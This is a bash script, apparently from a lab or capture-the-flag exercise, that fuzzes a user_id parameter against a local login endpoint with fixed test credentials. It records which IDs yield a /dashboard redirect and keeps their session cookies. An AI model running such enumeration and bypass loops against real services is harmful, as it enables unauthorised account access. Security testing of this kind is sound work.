# Fuzz user_id from 10000 to 10100 and identify valid authentications
echo "========================================="
echo "FUZZING user_id PARAMETER: 10000-10100"
echo "========================================="
echo ""

# Create a file to store valid user_ids
> /tmp/valid_users.txt

for id in {10000..10100}; do
    # Send POST request and capture response headers
    response=$(curl -s -i -c /tmp/cookie_${id}.txt \
        -d "username=test&user_id=${id}&password=test" \
        http://127.0.0.1:32821/password/test 2>&1)
    
    # Check if response contains redirect to /dashboard (successful auth)
    if echo "$response" | grep -q "Location: /dashboard"; then
        echo "[+] VALID: user_id=${id} - Successful authentication (302 redirect to /dashboard)"
        echo "$id" >> /tmp/valid_users.txt
    fi
    
    # Add a small delay to avoid overwhelming the server
    sleep 0.05
done

echo ""
echo "========================================="
echo "FUZZING COMPLETE"
echo "========================================="
echo ""
echo "Valid user_ids found:"
cat /tmp/valid_users.txt 2>/dev/null || echo "No valid user_ids found"
echo ""

